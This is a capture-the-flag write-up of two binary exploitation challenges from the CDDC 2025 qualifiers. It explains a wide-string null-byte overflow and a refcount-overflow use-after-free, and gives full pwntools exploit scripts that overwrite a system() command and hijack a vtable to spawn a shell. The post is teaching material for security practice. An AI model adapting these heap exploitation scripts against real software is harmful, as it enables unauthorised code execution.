---
title: Cyber Defender's Discovery Camp 2025 Qualifiers
description: brief writeup for pwn challenges
date: 2025-05-25 00:00:00 +0800
categories: [Writeups]
tags: [pwn]
toc: True
---

The Pwn challenges from CDDC this year were significantly more tedious than past years _(every one of the four challenges is stripped and implements its own custom memory allocator)_, but ended up being rewarding due to the fun bugs that were found after reverse engineering them.

## Account Protocol

After some reversing, we can identify the following operations for the program.

```py
def create_account(account_type, data):
    """Opcode 0: Create account
    account_type: 0 = binary/wide string, 1 = regular string
    Returns: account_id (0-15) or -1 on failure
    """
    payload = p8(0) + p8(account_type) + data
    s(payload)

def delete_account(account_id):
    """Opcode 1: Delete account (op_1)"""
    payload = p8(1) + p8(account_id)
    s(payload)

def update_account(account_id, account_type, data):
    """Opcode 2: Update account data
    account_type: 0 = binary/wide string, 1 = regular string
    """
    payload = p8(2) + p8(account_id) + p8(account_type) + data
    s(payload)

def display_account(account_id):
    """Opcode 3: Display account data"""
    payload = p8(3) + p8(account_id)
    s(payload)

def execute_command():
    """Opcode 255: Execute system command"""
    payload = p8(255)
    s(payload)
```

We basically get a CRUD menu where we can create, read, update and delete accounts. The accounts hold an `account_type` _(wide or regular string)_ and an `account_name` _(up to 254 characters)_ and is referred to via an incrementing `account_id` _(total of 16 accounts allowed)_.

### memory allocation

Upon allocation of a new account, it will allocate two memory chunks using their custom memory alloactor. One to store an `account_metadata` struct and the other to store the raw `account_name` data.

```c
struct account
{
  uint8_t type; // wide_str = 0, regular_str = 1
  uint8_t ref_count;
  char *data_ptr; // pointer to account_name
};
acc_metadata = (struct account_metadata *)custom_malloc(0x18u);
acc_data = (char *)custom_malloc(sz);
```

The custom allocator stores all the memory chunks adjacent to one another in its own `mmap'ed` buffer. Unlike regular `malloc`, there is no metadata that comes with each memory chunk _(such as the chunk size etc)_.

### wide string vs regular string

The program differentiates between a wide string and a regular string. Unlike the regular `strlen` or `strncpy` that is used for regular strings, the program implements its own functions to implement the equivalent wide-string functions.

```c
size_t wide_strlen(_BYTE *wstr)
{
  bool v2; // [rsp+1h] [rbp-19h]
  size_t length; // [rsp+Ah] [rbp-10h]

  for ( length = 0LL; ; ++length )
  {
    v2 = 1;
    if ( !*wstr )
      v2 = wstr[1] != 0;
    if ( !v2 )
      break;
    wstr += 2;
  }
  return length;
}

void copy_wide_string(_BYTE *dst, _BYTE *src)
{
  bool v2; // [rsp+1h] [rbp-21h]

  while ( 1 )
  {
    v2 = 1;
    if ( !*src )
      v2 = src[1] != 0;
    if ( !v2 )
      break;
    *dst = *src;
    dst[1] = src[1];
    dst += 2;
    src += 2;
  }
  *dst = 0;
  dst[1] = 0;
}
```

### the attack target

One of the functionality for the program is to run `system(command)` where **command** is a hardcoded-string that is allocated after running the command for the first time.

If we are able to **overwrite the command on the heap** to `/bin/sh`, we can eventually pop a shell.

### the bug

When calling `update_account`, you can modify an account type between a regular string and wide-string.

- Create a regular account of `account_name` with an even-length size _(i.e. 20)_. 
- If we convert `account` into a wide-string, it will cause a null-byte overflow when writing the 2 null-byte terminator for the wide-string.

If we can arrange the custom-heap such that the null-byte overflows into a meta-data chunk, we can write a null byte to an adjacent `account_metadata->type`.

This means that we can use the overflow to **change a regular string type into a wide string type**, despite it only having a single null byte terminator.

> When updating an account, it determines the size of the `account_data` by doing a **strlen/wide_strlen** based on the type of the account data.
>
> This means that if we convert a regular string to a wide-string, the **wide_strlen** will **read into the next adjacent chunk due to the lack of a wide-string terminator** _(2 null-bytes)_. This causes **wide_strlen** to return a larger value and allows us to overwrite the adjacent heap chunk.
{:.prompt-tip}

### the exploit

In order to get this to work, we want to arrange our heap into this state.

- Allocate Account A _(regular-str)_
- Allocate Account B _(regular-str)_
- Allocate COMMAND

```
meta A
________
data A
________
meta B
________
data B
________
CMD
```

1. `data A` null-byte overflows into `meta B` to convert it to a **wide-string**.
2. `data B` overflows into `command` to overwrite it.
3. run `system(command)` to get our shell.

```py
from pwn import *

elf = context.binary = ELF("./account")
libc = elf.libc
if args.REMOTE:
	p = remote("cddc2025-challs-nlb-579269aea83cde66.elb.ap-southeast-1.amazonaws.com", 7777)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

def create_account(account_type, data):
    """Opcode 0: Create account
    account_type: 0 = binary/wide string, 1 = regular string
    Returns: account_id (0-15) or -1 on failure
    """
    payload = p8(0) + p8(account_type) + data
    s(payload)

def delete_account(account_id):
    """Opcode 1: Delete account (op_1)"""
    payload = p8(1) + p8(account_id)
    s(payload)

def update_account(account_id, mode, data):
    """Opcode 2: Update account data
    mode: 0 = binary/wide string, 1 = regular string
    """
    payload = p8(2) + p8(account_id) + p8(mode) + data
    s(payload)

def display_account(account_id):
    """Opcode 3: Display account data"""
    payload = p8(3) + p8(account_id)
    s(payload)

def execute_command():
    """Opcode 255: Execute system command"""
    payload = p8(255)
    s(payload)

# setup heap state
create_account(1, b"A"*30)
pause()
create_account(1, b"B"*1)
pause()
execute_command()
pause()

# null-byte overflow
update_account(0, 0, b"D"*30)
pause()

# overflow
update_account(1, 0, b"D /bin/bash")
pause()

# run command
execute_command()
pause()

p.interactive()
```


## Workout

Upon running the program, we are shown a long interactive menu.

```c
*----------*
| WORK OUT |
*----------*

 1. New exercise
 2. List exercises
 3. Delete exercise
 4. New routine
 5. List routines
 6. Delete routine
 7. Set exercise to routine
 8. Remove exercise from routine
 9. Swap exercises in routine
10. View routine details
 0. Exit
```

A tl;dr of how this works is 

- Uses a custom sophisticated memory allocator that allows for memory reuse and memory coalescing.
- Create up to 10 `Exercise` objects that holds an `char exercise_name[38]`
- Create up to 7 `Routine` objects that holds up to 10 `Exercise` objects.
- Each `Exercise` object uses a `uint8 refcount` to determine when it should be free-ed.

The memory allocator is used to allocate `Routine` and `Exercise` objects.

```c
struct Routine
{
  void *vtable;
  unsigned __int8 day;
  void *exercises[10];
}; // size 0x60

struct Exercise
{
  ExerciseVTable *vtable;
  unsigned __int8 refcount;
  unsigned __int8 id;
  char name[38];
}; // size 0x30
```

### the bug

```c
__int64 xor_swap_routine_entries(
        __int64 this,
        WorkoutRoutine *routine,
        unsigned __int8 ex_id_1,
        unsigned __int8 ex_id_2)
{
  // ... truncated ...
  if ( ex_id_1 < 0xAu && ex_id_2_ < 0xAu )
  {
    ex1 = &routine->exercise_slots[ex_id_1_];
    ex2 = &routine->exercise_slots[ex_id_2_];   // if v15 == v14, then v8 == v9. This nulls the exercise_slot.
    *ex1 = (*ex1 ^ *ex2);
    *ex2 = (*ex2 ^ *ex1);
    *ex1 = (*ex1 ^ *ex2);
    create_success_result();
    wrap_success_result(a1);
  }
  // ... truncated ...
}
```

1. Adding an `Exercise` to `Routine` increases the `Exercise->refcount` by 1
2. Swapping the `Exercise` with itself in `Routine` removes the pointer from the `Routine`
3. Repeat Step 1 **256 times** to overflow `Exercise->refcount` back to 1.
4. Delete the `Exercise` from the `Routine` which calls `destruct_exercise` to decrement `Exercise->refcount` to 0 which results in it getting free-ed.
5. Since we did not delete the `Exercise`, we still hold a pointer to the free-ed `Exercise` object and have a UAF.

### the exploit

After we have the UAF, we can allocate another `Routine` to re-use the free-ed memory. Now we have an overlapping `Exercise` and `Routine`.

We can **delete** and re-**allocate** the exercise to overwrite the `Routine->exercises[]` pointers.

This gives us an arbitrary read and arbitrary free. We can create fake chunks to be free-ed and overwrite the `vtable` entry to point to a `one_gadget` to pop a shell.

### exploit script

```py
from pwn import *
from tqdm import tqdm

elf = context.binary = ELF("workout")
libc = elf.libc
# if args.REMOTE:
# p = remote("localhost", 9999)
p = remote("cddc2025-challs-nlb-579269aea83cde66.elb.ap-southeast-1.amazonaws.com", 9999)
# else:
# 	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

def new_exercise(name):
    sla(b"Menu>>", b"1")
    sla(b"Name>>", name)

def list_exercise():
    sla(b"Menu>>", b"2")

def delete_exercise(id):
    sla(b"Menu>>", b"3")
    sla(b"id>>", str(id).encode())

def new_routine(id):
    sla(b"Menu>>", b"4")
    sla(b"0)>>", str(id).encode())

def list_routine():
    sla(b"Menu>>", b"5")

def delete_routine(id):
    sla(b"Menu>>", b"6")
    sla(b"0)>>", str(id).encode())

def set_exercise_to_routine(exercise_id,routine_id):
    sla(b"Menu>>", b"7")
    sla(b"id>>", str(exercise_id).encode())
    sla(b"0)>>", str(routine_id).encode())

def remove_exercise_to_routine(exercise_id,routine_id):
    sla(b"Menu>>", b"8")
    sla(b"0)>>", str(routine_id).encode())
    sla(b"routine>>", str(exercise_id).encode())

def swap_exercise_routine(routine_id, exercise_id_1, exercise_id_2):
    sla(b"Menu>>", b"9")
    sla(b"0)>>", str(routine_id).encode())
    sla(b"routine>>", str(exercise_id_1).encode())
    sla(b"routine>>", str(exercise_id_2).encode())

def view_routine_details(id):
    sla(b"Menu>>", b"10")
    sla(b"0)>>", str(id).encode())


new_exercise(b"aaaaaab") # refcount = 1
new_routine(0)

# overflow refcount to 0
for _ in tqdm(range(255)):
    set_exercise_to_routine(0, 0)
    swap_exercise_routine(0, 0, 0)

set_exercise_to_routine(0, 0) # refcount = 1
delete_routine(0) # refcount = 0, exercise is free-ed

new_routine(1) # day = 1, refcount = 1 (overlap)

new_exercise(b"zz")
new_exercise(b"XXXXXXXXX")
new_exercise(b"QQQQQQQQX")
delete_exercise(0)
set_exercise_to_routine(1, 1) # write a pointer to routine->exercise[0]

# leak custom memory manager base

new_exercise(b"aaaaaa\x01")
view_routine_details(1)
ru(b"aaaaa")
memorymanager_base = unpack(rl().strip(), "all") - 1
print(f"memory manager base @ {hex(memorymanager_base)}")

# leak elf base via vtable ptr

delete_exercise(0)
new_exercise(b"aaaaaa" + p64(memorymanager_base+0x60-0xa))
view_routine_details(1)

ru(b"[0] ")
elf.address = unpack(rl().strip(), "all")  - 0x1cae0
print(f"elf base @ {hex(elf.address)}")

# leak libc base via GOT

delete_exercise(0)
new_exercise(b"aaaaaa" + p64(elf.got.setvbuf-0xa))
view_routine_details(1)

ru(b"[0] ")
libc.address = unpack(rl().strip(), "all")  - libc.sym.setvbuf
print(f"libc base @ {hex(libc.address)}")

# now i want a UAF on the second part of a routine

delete_exercise(0)
new_exercise(b"aaaaaa" + p64(memorymanager_base+0x40))
delete_exercise(2)
new_exercise(b"A"*6 + p64(0x4242424242424242) + p8(0x1))
delete_exercise(2)
new_exercise(b"A"*6 + p64(memorymanager_base+0xa0-8)) # write vtable pointer
delete_exercise(3)
new_exercise(b"A"*6 + p64(libc.address + 965765) + p8(0x1)) # write vtable entry to be called
remove_exercise_to_routine(0, 1)

p.interactive()

"""
❯ python3 solve.py
[*] '/mnt/sdb/CTF/2025/CDDC/Quals/pwn/workout/workout'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/mnt/sdb/CTF/2025/CDDC/Quals/pwn/workout/workout': pid 275476
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 255/255 [00:00<00:00, 678.38it/s]
memory manager base @ 0x7faed2d73000
elf base @ 0x55b3fcdc9000
libc base @ 0x7faed2780000
[*] Switching to interactive mode
$ cat flag
CDDC2025{THIS_IS_A_FAKE_FLAG}
"""
```